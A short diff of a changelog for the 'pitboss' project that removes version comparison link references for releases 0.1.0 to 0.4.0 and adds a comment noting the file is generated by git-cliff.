-[0.4.0]: https://github.com/SDS-Mode/pitboss/compare/v0.3.4...v0.4.0
-[0.3.4]: https://github.com/SDS-Mode/pitboss/compare/v0.3.3...v0.3.4
-[0.3.3]: https://github.com/SDS-Mode/pitboss/compare/v0.3.2...v0.3.3
-[0.3.2]: https://github.com/SDS-Mode/pitboss/compare/v0.3.1...v0.3.2
-[0.3.1]: https://github.com/SDS-Mode/pitboss/compare/v0.3.0...v0.3.1
-[0.3.0]: https://github.com/SDS-Mode/pitboss/compare/v0.2.2...v0.3.0
-[0.2.2]: https://github.com/SDS-Mode/pitboss/compare/v0.2.1...v0.2.2
-[0.2.1]: https://github.com/SDS-Mode/pitboss/compare/v0.2.0...v0.2.1
-[0.2.0]: https://github.com/SDS-Mode/pitboss/compare/v0.1.0...v0.2.0
-[0.1.0]: https://github.com/SDS-Mode/pitboss/releases/tag/v0.1.0
+<!-- generated by git-cliff -->
